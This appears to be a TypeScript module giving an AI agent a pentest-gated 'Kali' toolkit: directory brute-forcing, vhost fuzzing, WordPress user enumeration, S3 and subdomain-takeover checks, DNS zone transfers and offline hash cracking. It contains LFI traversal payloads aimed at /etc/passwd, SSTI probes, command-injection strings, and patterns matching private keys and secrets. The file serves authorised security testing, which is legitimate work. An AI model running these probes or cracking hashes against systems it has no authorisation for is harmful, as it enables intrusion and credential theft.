import net from 'node:net';
import crypto from 'node:crypto';
import fs from 'node:fs';
import { z } from 'zod';
import type { ResolvedConfig } from '../config/types.js';
import { resolveInCwd } from '../utils/paths.js';
import { truncateMiddle } from '../utils/truncate.js';
import { err, ok, type ToolDefinition, type ToolResult } from './types.js';
import { rawHttp } from './offsec.js';

/**
 * Kali-style offensive toolkit for AUTHORIZED engagements (pentest-mode gated,
 * category 'pentest'). Content discovery, vhost/CMS enumeration, subdomain
 * takeover, cloud-bucket checks, DNS zone transfer, WHOIS, offline hash
 * cracking, and injection-detection PoCs (LFI / SSTI / command injection).
 *
 * Everything is bounded, rate-limited, and detection/PoC-level — no DoS, no
 * mass exploitation, no destructive payloads. HTTP reuses the shared client so
 * it also tunnels through Burp/ZAP when a proxy is configured.
 */

const GATE = 'Pentest mode is OFF. These tools only run in authorized security-testing mode — enable it with /pentest.';
function gate(config: ResolvedConfig): ToolResult | null {
  return config.pentest ? null : err(GATE);
}
const MAX_OUTPUT = 20_000;
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const COMMON_PATHS = [
  'admin', 'administrator', 'login', 'wp-admin', 'wp-login.php', 'dashboard', 'api', 'api/v1', 'api/v2',
  'config', 'config.php', 'config.json', 'settings.py', '.env', '.env.local', '.git/HEAD', '.git/config',
  'backup', 'backup.zip', 'backup.sql', 'db.sql', 'dump.sql', 'database.sql', 'old', 'test', 'dev', 'staging',
  'phpinfo.php', 'info.php', 'server-status', 'server-info', 'debug', 'console', 'actuator', 'actuator/health',
  'actuator/env', 'metrics', 'swagger', 'swagger-ui', 'swagger.json', 'openapi.json', 'graphql', 'graphiql',
  'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'security.txt', '.well-known/security.txt', 'readme.html',
  'README.md', 'CHANGELOG.md', 'LICENSE', 'uploads', 'files', 'images', 'assets', 'static', 'private', 'secret',
  'internal', 'user', 'users', 'account', 'accounts', 'profile', 'register', 'signup', 'logout', 'reset',
  'forgot-password', 'cpanel', 'phpmyadmin', 'adminer.php', 'wp-config.php.bak', 'web.config', '.htaccess',
  'Dockerfile', 'docker-compose.yml', '.dockerignore', 'package.json', 'composer.json', 'yarn.lock',
];

async function tcpQuery(host: string, port: number, payload: string, timeout = 9000): Promise<Buffer> {
  return new Promise((resolve, reject) => {
    const chunks: Buffer[] = [];
    const s = net.connect(port, host, () => s.write(payload));
    s.setTimeout(timeout, () => s.destroy(new Error('timeout')));
    s.on('data', (d) => chunks.push(d));
    s.on('error', reject);
    s.on('close', () => resolve(Buffer.concat(chunks)));
  });
}

// murmur3 x86 32-bit (Shodan favicon hash format)
function mmh3(buf: Buffer): number {
  const c1 = 0xcc9e2d51, c2 = 0x1b873593;
  let h1 = 0;
  const len = buf.length;
  const rounded = len & ~3;
  const rotl = (x: number, r: number) => (x << r) | (x >>> (32 - r));
  const mul = (a: number, b: number) => {
    const al = a & 0xffff, ah = a >>> 16;
    return ((al * b + (((ah * b) & 0xffff) << 16)) & 0xffffffff);
  };
  for (let i = 0; i < rounded; i += 4) {
    let k1 = buf[i]! | (buf[i + 1]! << 8) | (buf[i + 2]! << 16) | (buf[i + 3]! << 24);
    k1 = mul(k1, c1); k1 = rotl(k1, 15); k1 = mul(k1, c2);
    h1 ^= k1; h1 = rotl(h1, 13); h1 = (mul(h1, 5) + 0xe6546b64) & 0xffffffff;
  }
  let k1 = 0;
  const tail = len & 3;
  if (tail === 3) k1 ^= buf[rounded + 2]! << 16;
  if (tail >= 2) k1 ^= buf[rounded + 1]! << 8;
  if (tail >= 1) { k1 ^= buf[rounded]!; k1 = mul(k1, c1); k1 = rotl(k1, 15); k1 = mul(k1, c2); h1 ^= k1; }
  h1 ^= len;
  h1 ^= h1 >>> 16; h1 = mul(h1, 0x85ebca6b); h1 ^= h1 >>> 13; h1 = mul(h1, 0xc2b2ae35); h1 ^= h1 >>> 16;
  return h1 | 0; // signed 32-bit, matches Shodan
}

function loadList(cwd: string, inline?: string[], file?: string, fallback: string[] = [], cap = 5000): string[] {
  if (inline && inline.length) return inline.slice(0, cap);
  if (file) {
    const raw = fs.readFileSync(resolveInCwd(cwd, file), 'utf8');
    return raw.split(/\r?\n/).map((l) => l.trim()).filter((l) => l && !l.startsWith('#')).slice(0, cap);
  }
  return fallback;
}

export function createKaliTools(config: ResolvedConfig): ToolDefinition[] {
  // ---- dir_bruteforce (gobuster/dirb) ----
  const dirSchema = z.object({
    url: z.string().min(1).describe('Base URL, e.g. https://target'),
    wordlistFile: z.string().optional().describe('Path list file (one per line). Defaults to a built-in common list.'),
    extensions: z.array(z.string()).max(10).optional().describe('Also try these extensions, e.g. ["php","bak","zip"].'),
    maxRequests: z.number().int().positive().max(2000).optional().describe('Cap (default 300).'),
    delayMs: z.number().int().min(0).max(1000).optional(),
  });
  const dirBruteforce: ToolDefinition<z.infer<typeof dirSchema>> = {
    name: 'dir_bruteforce',
    category: 'pentest',
    description: '[KALI] Content discovery (gobuster/dirb style): brute common paths on a web root and report which exist, with status and size. Bounded and rate-limited. Pentest mode must be ON.',
    parameters: { type: 'object', properties: { url: { type: 'string' }, wordlistFile: { type: 'string' }, extensions: { type: 'array', items: { type: 'string' } }, maxRequests: { type: 'number' }, delayMs: { type: 'number' } }, required: ['url'] },
    schema: dirSchema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `dirbrute ${a.url.slice(0, 60)}`,
    async execute(a, ctx) {
      const g = gate(config); if (g) return g;
      const base = a.url.replace(/\/+$/, '');
      let words = loadList(ctx.cwd, undefined, a.wordlistFile, COMMON_PATHS);
      if (a.extensions?.length) words = words.flatMap((w) => [w, ...a.extensions!.map((e) => `${w}.${e.replace(/^\./, '')}`)]);
      const cap = Math.min(words.length, a.maxRequests ?? 300);
      const delay = a.delayMs ?? 30;
      const hits: string[] = [];
      for (let i = 0; i < cap; i++) {
        if (ctx.signal?.aborted) break;
        const path = '/' + words[i]!.replace(/^\//, '');
        try {
          const r = await rawHttp('GET', base + path, { timeout: 8000 });
          if (r.status !== 404 && r.status !== 0) {
            const flag = /passwd:.*:0:0:|BEGIN (RSA|OPENSSH) PRIVATE KEY|DB_PASSWORD|aws_secret/i.test(r.body) ? '  🚨 sensitive content' : '';
            hits.push(`${String(r.status).padEnd(3)} ${String(r.body.length).padStart(7)}b  ${path}${flag}`);
          }
        } catch { /* skip */ }
        if (delay) await sleep(delay);
      }
      return ok(`dir_bruteforce ${base} — ${cap} paths tried, ${hits.length} hits:\n\n${hits.join('\n') || '(nothing found)'}`.slice(0, MAX_OUTPUT), { kind: 'info', title: 'DirBrute' });
    },
  };

  // ---- vhost_scan ----
  const vhostSchema = z.object({
    url: z.string().min(1).describe('Base URL pointing at the IP/host to test.'),
    hosts: z.array(z.string()).max(500).optional().describe('Candidate Host header values.'),
    wordlistFile: z.string().optional().describe('File of candidate vhosts (one per line).'),
    baseDomain: z.string().optional().describe('If set, candidates are prefixed as <word>.<baseDomain>.'),
  });
  const vhostScan: ToolDefinition<z.infer<typeof vhostSchema>> = {
    name: 'vhost_scan',
    category: 'pentest',
    description: '[KALI] Virtual-host discovery: fuzz the Host header against one IP and flag responses that differ from the baseline (hidden apps/staging). Pentest mode must be ON.',
    parameters: { type: 'object', properties: { url: { type: 'string' }, hosts: { type: 'array', items: { type: 'string' } }, wordlistFile: { type: 'string' }, baseDomain: { type: 'string' } }, required: ['url'] },
    schema: vhostSchema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `vhost ${a.url.slice(0, 50)}`,
    async execute(a, ctx) {
      const g = gate(config); if (g) return g;
      let cands = loadList(ctx.cwd, a.hosts, a.wordlistFile, ['www', 'dev', 'staging', 'test', 'api', 'admin', 'internal', 'beta', 'portal', 'vpn', 'mail', 'git', 'jenkins']);
      if (a.baseDomain) cands = cands.map((c) => (c.includes('.') ? c : `${c}.${a.baseDomain}`));
      const baseline = await rawHttp('GET', a.url, { timeout: 8000 }).catch(() => null);
      const bl = baseline ? baseline.body.length : -1;
      const rows: string[] = [];
      for (let i = 0; i < Math.min(cands.length, 300); i++) {
        if (ctx.signal?.aborted) break;
        try {
          const r = await rawHttp('GET', a.url, { headers: { Host: cands[i]! }, timeout: 8000 });
          if (r.status !== 404 && Math.abs(r.body.length - bl) > 48) rows.push(`${String(r.status).padEnd(3)} ${String(r.body.length).padStart(7)}b  Host: ${cands[i]}`);
        } catch { /* skip */ }
        await sleep(30);
      }
      return ok(`vhost_scan (baseline ${bl}b) — ${rows.length} interesting:\n\n${rows.join('\n') || '(none differed)'}`.slice(0, MAX_OUTPUT), { kind: 'info', title: 'VHost' });
    },
  };

  // ---- wpscan-lite ----
  const wpSchema = z.object({ url: z.string().min(1).describe('WordPress base URL.') });
  const wpscan: ToolDefinition<z.infer<typeof wpSchema>> = {
    name: 'wpscan',
    category: 'pentest',
    description: '[KALI] WordPress enumeration: detect version, enumerate users (author scan + REST), and list readme/exposed files. Pentest mode must be ON.',
    parameters: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] },
    schema: wpSchema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `wpscan ${a.url.slice(0, 50)}`,
    async execute(a) {
      const g = gate(config); if (g) return g;
      const base = a.url.replace(/\/+$/, '');
      const out: string[] = [];
      try {
        const home = await rawHttp('GET', base + '/', { timeout: 10000 });
        const ver = /content="WordPress ([0-9.]+)"/i.exec(home.body)?.[1];
        out.push(`Version: ${ver ?? 'unknown (meta generator hidden)'}`);
        if (!/wp-content|wp-json|wp-includes/i.test(home.body)) out.push('⚠ This may not be WordPress (no wp-* markers).');
        const rest = await rawHttp('GET', base + '/wp-json/wp/v2/users', { timeout: 8000 }).catch(() => null);
        if (rest && rest.status === 200) {
          try { const users = JSON.parse(rest.body) as Array<{ id: number; name: string; slug: string }>; out.push(`Users (REST): ${users.map((u) => `${u.id}:${u.slug}`).join(', ')}`); } catch { /* ignore */ }
        }
        const authors: string[] = [];
        for (let i = 1; i <= 5; i++) {
          const r = await rawHttp('GET', base + `/?author=${i}`, { timeout: 6000 }).catch(() => null);
          const slug = r ? /\/author\/([^/"]+)/.exec(r.headers['location'] ?? r.body)?.[1] : undefined;
          if (slug) authors.push(`${i}:${slug}`);
          await sleep(30);
        }
        if (authors.length) out.push(`Users (author scan): ${authors.join(', ')}`);
        for (const f of ['/readme.html', '/wp-content/debug.log', '/wp-config.php.bak', '/xmlrpc.php']) {
          const r = await rawHttp('GET', base + f, { timeout: 6000 }).catch(() => null);
          if (r && r.status < 400) out.push(`Exposed: ${f} (${r.status})`);
        }
        return ok(`wpscan ${base}:\n\n${out.join('\n')}`.slice(0, MAX_OUTPUT), { kind: 'info', title: 'wpscan' });
      } catch (e) { return err(`wpscan failed: ${(e as Error).message}`); }
    },
  };

  // ---- subdomain takeover ----
  const toSchema = z.object({ host: z.string().min(1).describe('Subdomain to check, e.g. blog.example.com') });
  const FINGERPRINTS: Array<{ svc: string; sig: RegExp }> = [
    { svc: 'GitHub Pages', sig: /There isn't a GitHub Pages site here|404.*github/i },
    { svc: 'AWS S3', sig: /NoSuchBucket|The specified bucket does not exist/i },
    { svc: 'Heroku', sig: /no-such-app\.herokuapp|No such app/i },
    { svc: 'Shopify', sig: /Sorry, this shop is currently unavailable/i },
    { svc: 'Fastly', sig: /Fastly error: unknown domain/i },
    { svc: 'Netlify', sig: /Not Found - Request ID|netlify/i },
    { svc: 'Azure', sig: /404 Web Site not found|azurewebsites/i },
    { svc: 'Unbounce', sig: /The requested URL was not found on this server\.?.*unbounce/i },
  ];
  const takeoverCheck: ToolDefinition<z.infer<typeof toSchema>> = {
    name: 'takeover_check',
    category: 'pentest',
    description: '[KALI] Check a subdomain for a dangling-service (subdomain takeover) fingerprint — a claimable GitHub Pages/S3/Heroku/etc. host. Pentest mode must be ON.',
    parameters: { type: 'object', properties: { host: { type: 'string' } }, required: ['host'] },
    schema: toSchema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `takeover ${a.host}`,
    async execute(a) {
      const g = gate(config); if (g) return g;
      const host = a.host.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
      for (const scheme of ['https', 'http']) {
        try {
          const r = await rawHttp('GET', `${scheme}://${host}/`, { timeout: 8000 });
          for (const f of FINGERPRINTS) if (f.sig.test(r.body)) return ok(`⚠ POTENTIAL SUBDOMAIN TAKEOVER on ${host}: matches ${f.svc} unclaimed-resource fingerprint (HTTP ${r.status}). Verify the CNAME points to an unregistered ${f.svc} resource, then claim it to prove impact.`, { kind: 'info', title: 'Takeover' });
          return ok(`${host}: responds ${r.status} (${r.body.length}b), no takeover fingerprint matched.`, { kind: 'info', title: 'Takeover' });
        } catch { /* try http */ }
      }
      return ok(`${host}: no HTTP response (could be NXDOMAIN or dangling — check DNS/CNAME).`, { kind: 'info', title: 'Takeover' });
    },
  };

  // ---- S3 bucket check ----
  const s3Schema = z.object({ bucket: z.string().min(1).describe('Bucket name or full https URL.') });
  const s3Check: ToolDefinition<z.infer<typeof s3Schema>> = {
    name: 's3_check',
    category: 'pentest',
    description: '[KALI] Test an AWS S3 bucket for public listing/read access (common cloud misconfiguration). Pentest mode must be ON.',
    parameters: { type: 'object', properties: { bucket: { type: 'string' } }, required: ['bucket'] },
    schema: s3Schema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `s3 ${a.bucket.slice(0, 50)}`,
    async execute(a) {
      const g = gate(config); if (g) return g;
      const name = a.bucket.replace(/^https?:\/\//, '').replace(/\.s3[.-].*/, '').replace(/\/.*$/, '');
      const url = `https://${name}.s3.amazonaws.com/`;
      try {
        const r = await rawHttp('GET', url, { timeout: 10000 });
        if (r.status === 200 && /<ListBucketResult/.test(r.body)) {
          const keys = [...r.body.matchAll(/<Key>([^<]+)<\/Key>/g)].map((m) => m[1]).slice(0, 40);
          return ok(`🚨 OPEN S3 BUCKET "${name}" — public listing allowed (${r.status}). First objects:\n${keys.map((k) => '  ' + k).join('\n') || '(empty)'}`, { kind: 'info', title: 'S3' });
        }
        if (r.status === 403) return ok(`Bucket "${name}" exists but listing is denied (403). Try reading specific known object keys.`, { kind: 'info', title: 'S3' });
        if (r.status === 404 || /NoSuchBucket/.test(r.body)) return ok(`Bucket "${name}" does not exist.`, { kind: 'info', title: 'S3' });
        return ok(`Bucket "${name}" → ${r.status}. ${truncateMiddle(r.body, { maxChars: 400 }).text}`, { kind: 'info', title: 'S3' });
      } catch (e) { return err(`S3 check failed: ${(e as Error).message}`); }
    },
  };

  // ---- DNS zone transfer (AXFR) ----
  const axfrSchema = z.object({ domain: z.string().min(1).describe('Domain, e.g. example.com'), nameserver: z.string().min(1).describe('Name server host/IP to ask (dig this from dns_enum NS records).') });
  const dnsAxfr: ToolDefinition<z.infer<typeof axfrSchema>> = {
    name: 'dns_axfr',
    category: 'pentest',
    description: '[KALI] Attempt a DNS zone transfer (AXFR) against a name server — a classic misconfiguration that dumps every record in the zone. Pentest mode must be ON.',
    parameters: { type: 'object', properties: { domain: { type: 'string' }, nameserver: { type: 'string' } }, required: ['domain', 'nameserver'] },
    schema: axfrSchema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `axfr ${a.domain} @${a.nameserver}`,
    async execute(a) {
      const g = gate(config); if (g) return g;
      // build a TCP DNS AXFR (type 252) query
      const labels: number[] = [];
      for (const l of a.domain.split('.')) { labels.push(l.length); for (const b of Buffer.from(l)) labels.push(b); }
      labels.push(0);
      const msg = Buffer.concat([
        Buffer.from([0x13, 0x37, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
        Buffer.from(labels),
        Buffer.from([0x00, 0xfc, 0x00, 0x01]), // AXFR, IN
      ]);
      const framed = Buffer.concat([Buffer.from([(msg.length >> 8) & 0xff, msg.length & 0xff]), msg]);
      try {
        const resp = await tcpQuery(a.nameserver, 53, framed.toString('latin1'), 12000);
        if (resp.length < 12) return ok(`No usable response from ${a.nameserver} (zone transfer likely refused).`, { kind: 'info', title: 'AXFR' });
        // skip 2-byte length prefix; header at +2
        const rcode = resp[5]! & 0x0f;
        const ancount = (resp[8]! << 8) | resp[9]!;
        if (rcode === 5) return ok(`AXFR REFUSED by ${a.nameserver} (good — zone transfer is locked down).`, { kind: 'info', title: 'AXFR' });
        if (ancount === 0) return ok(`AXFR returned no answers (rcode ${rcode}) — likely not allowed.`, { kind: 'info', title: 'AXFR' });
        // heuristic name extraction
        const names = new Set<string>();
        const text = resp.toString('latin1');
        for (const m of text.matchAll(/([a-z0-9_-]{1,63}(?:\.[a-z0-9_-]{1,63})*\.[a-z]{2,})/gi)) if (m[1]!.includes(a.domain)) names.add(m[1]!.toLowerCase());
        return ok(`🚨 ZONE TRANSFER ALLOWED by ${a.nameserver} for ${a.domain} (${ancount} records). Names seen:\n${[...names].slice(0, 200).join('\n') || '(parse the raw records with dig)'}`.slice(0, MAX_OUTPUT), { kind: 'info', title: 'AXFR' });
      } catch (e) { return err(`AXFR failed: ${(e as Error).message}`); }
    },
  };

  // ---- WHOIS ----
  const whoisSchema = z.object({ query: z.string().min(1).describe('Domain or IP.') });
  const whois: ToolDefinition<z.infer<typeof whoisSchema>> = {
    name: 'whois',
    category: 'pentest',
    description: '[KALI] WHOIS lookup for a domain or IP (registrar, dates, name servers, org) via the WHOIS protocol, following IANA referral. Pentest mode must be ON.',
    parameters: { type: 'object', properties: { query: { type: 'string' } }, required: ['query'] },
    schema: whoisSchema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `whois ${a.query}`,
    async execute(a) {
      const g = gate(config); if (g) return g;
      const q = a.query.trim();
      try {
        const first = (await tcpQuery('whois.iana.org', 43, q + '\r\n')).toString('utf8');
        const refer = /refer:\s*(\S+)/i.exec(first)?.[1] || /whois:\s*(\S+)/i.exec(first)?.[1];
        let body = first;
        if (refer) {
          try { const second = (await tcpQuery(refer, 43, q + '\r\n')).toString('utf8'); if (second.trim()) body = second; } catch { /* keep IANA */ }
        }
        return ok(truncateMiddle(body, { maxChars: MAX_OUTPUT }).text, { kind: 'info', title: 'WHOIS' });
      } catch (e) { return err(`WHOIS failed: ${(e as Error).message}`); }
    },
  };

  // ---- offline hash cracking ----
  const crackSchema = z.object({
    hash: z.string().min(3).describe('Target hash (hex) or NTLM/MySQL form.'),
    wordlistFile: z.string().describe('Wordlist file (one candidate per line), relative to workspace.'),
    algo: z.enum(['auto', 'md5', 'sha1', 'sha256', 'sha512', 'ntlm']).optional().describe('Default auto (by length).'),
    max: z.number().int().positive().max(2_000_000).optional().describe('Max candidates (default 200000).'),
  });
  const hashCrack: ToolDefinition<z.infer<typeof crackSchema>> = {
    name: 'hash_crack',
    category: 'pentest',
    description: '[KALI] Offline dictionary attack: hash each wordlist candidate (md5/sha1/sha256/sha512/NTLM) and stop when it matches the target. No network. Only use on hashes from an authorized engagement. Pentest mode must be ON.',
    parameters: { type: 'object', properties: { hash: { type: 'string' }, wordlistFile: { type: 'string' }, algo: { type: 'string', enum: ['auto', 'md5', 'sha1', 'sha256', 'sha512', 'ntlm'] }, max: { type: 'number' } }, required: ['hash', 'wordlistFile'] },
    schema: crackSchema,
    kind: 'execute',
    mutating: false,
    summarize: (a) => `crack ${a.hash.slice(0, 20)}…`,
    async execute(a, ctx) {
      const g = gate(config); if (g) return g;
      const target = a.hash.trim().toLowerCase().replace(/^\*/, '');
      let algo = a.algo ?? 'auto';
      if (algo === 'auto') algo = ({ 32: 'md5', 40: 'sha1', 64: 'sha256', 128: 'sha512' } as Record<number, 'md5' | 'sha1' | 'sha256' | 'sha512'>)[target.length] ?? 'md5';
      const hashOf = (w: string): string | null => {
        try {
          if (algo === 'ntlm') return crypto.createHash('md4').update(Buffer.from(w, 'utf16le')).digest('hex');
          return crypto.createHash(algo).update(w).digest('hex');
        } catch { return null; }
      };
      let words: string[];
      try { words = loadList(ctx.cwd, undefined, a.wordlistFile, [], a.max ?? 200_000); } catch (e) { return err(`Could not load wordlist: ${(e as Error).message}`); }
      if (algo === 'ntlm' && hashOf('test') === null) return err('NTLM (MD4) is not available in this OpenSSL build.');
      let tried = 0;
      for (const w of words) {
        if (ctx.signal?.aborted) break;
        tried++;
        if (hashOf(w) === target) return ok(`✅ CRACKED (${algo}) after ${tried} candidates:\n${a.hash}  :  ${w}`, { kind: 'info', title: 'HashCrack' });
      }
      return ok(`Not found in ${tried} candidates (${algo}). Try a bigger or rule-mutated wordlist.`, { kind: 'info', title: 'HashCrack' });
    },
  };

  // ---- injection PoC probes (LFI / SSTI / command injection) ----
  const injSchema = z.object({
    url: z.string().min(1).describe('URL with a FUZZ marker at the injection point, e.g. https://t/page?file=FUZZ'),
    kind: z.enum(['lfi', 'ssti', 'cmdi']).describe('Which injection class to test.'),
  });
  const LFI = ['../../../../../../etc/passwd', '....//....//....//etc/passwd', '..%2f..%2f..%2fetc%2fpasswd', '/etc/passwd', '../../../../../../windows/win.ini', 'php://filter/convert.base64-encode/resource=index'];
  const SSTI = ['{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>', '{{7*"7"}}'];
  const injProbe: ToolDefinition<z.infer<typeof injSchema>> = {
    name: 'inject_probe',
    category: 'pentest',
    description: '[KALI] Safe detection PoC for LFI (path traversal → /etc/passwd), SSTI (template eval, {{7*7}}→49) or command injection (echo of a random marker). Replace the injection point with FUZZ. Detection only — no destructive payloads. Pentest mode must be ON.',
    parameters: { type: 'object', properties: { url: { type: 'string' }, kind: { type: 'string', enum: ['lfi', 'ssti', 'cmdi'] } }, required: ['url', 'kind'] },
    schema: injSchema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `${a.kind} ${a.url.slice(0, 50)}`,
    async execute(a, ctx) {
      const g = gate(config); if (g) return g;
      if (!a.url.includes('FUZZ')) return err('Put a FUZZ marker where the payload should be injected.');
      const marker = 'ox' + Math.random().toString(36).slice(2, 9);
      const payloads = a.kind === 'lfi' ? LFI : a.kind === 'ssti' ? SSTI : [`;echo ${marker}`, `|echo ${marker}`, `$(echo ${marker})`, `\`echo ${marker}\``, `%0aecho ${marker}`];
      const findings: string[] = [];
      for (const p of payloads) {
        if (ctx.signal?.aborted) break;
        const url = a.url.split('FUZZ').join(encodeURIComponent(p));
        try {
          const r = await rawHttp('GET', url, { timeout: 9000 });
          let hit = false;
          if (a.kind === 'lfi') hit = /root:.*:0:0:|\[fonts\]|\[extensions\]|for 16-bit app support/i.test(r.body);
          else if (a.kind === 'ssti') hit = /(^|[^0-9])49([^0-9]|$)/.test(r.body) && !r.body.includes(p);
          else hit = r.body.includes(marker);
          findings.push(`  ${hit ? '🚨 HIT' : '  --'}  ${r.status}  ${JSON.stringify(p).slice(0, 50)}`);
          if (hit) { findings.push(`\nVULNERABLE (${a.kind.toUpperCase()}): payload ${JSON.stringify(p)} confirmed via response. Evidence excerpt:\n${truncateMiddle(r.body, { maxChars: 500 }).text}`); break; }
        } catch (e) { findings.push(`  err  ${(e as Error).message}`); }
        await sleep(40);
      }
      return ok(`inject_probe (${a.kind}) on ${a.url}:\n\n${findings.join('\n')}`.slice(0, MAX_OUTPUT), { kind: 'info', title: 'Inject' });
    },
  };

  // ---- favicon hash (Shodan fingerprint) ----
  const favSchema = z.object({ url: z.string().min(1).describe('Site base URL (favicon fetched from /favicon.ico) or a direct favicon URL.') });
  const faviconHash: ToolDefinition<z.infer<typeof favSchema>> = {
    name: 'favicon_hash',
    category: 'pentest',
    description: '[KALI] Compute the mmh3 (Shodan) favicon hash of a target — pivot to find every other host with the same favicon via Shodan `http.favicon.hash:<value>`. Pentest mode must be ON.',
    parameters: { type: 'object', properties: { url: { type: 'string' } }, required: ['url'] },
    schema: favSchema,
    kind: 'execute',
    mutating: true,
    summarize: (a) => `favicon ${a.url.slice(0, 50)}`,
    async execute(a) {
      const g = gate(config); if (g) return g;
      const target = a.url.endsWith('.ico') || /favicon/i.test(a.url) ? a.url : a.url.replace(/\/+$/, '') + '/favicon.ico';
      try {
        const r = await rawHttp('GET', target, { timeout: 10000 });
        if (r.status !== 200 || !r.body) return ok(`No favicon at ${target} (HTTP ${r.status}).`, { kind: 'info', title: 'Favicon' });
        const raw = Buffer.from(r.body, 'latin1');
        const b64 = raw.toString('base64').replace(/(.{76})/g, '$1\n') + '\n';
        const hash = mmh3(Buffer.from(b64, 'utf8'));
        return ok(`favicon_hash for ${target}:\n  mmh3 = ${hash}\n\nPivot: Shodan → http.favicon.hash:${hash}  |  Censys/FOFA support the same. Finds sibling hosts sharing this favicon.`, { kind: 'info', title: 'Favicon' });
      } catch (e) { return err(`favicon_hash failed: ${(e as Error).message}`); }
    },
  };

  return [dirBruteforce, vhostScan, wpscan, takeoverCheck, s3Check, dnsAxfr, whois, hashCrack, injProbe, faviconHash];
}

export const _kaliInternal = { mmh3 };
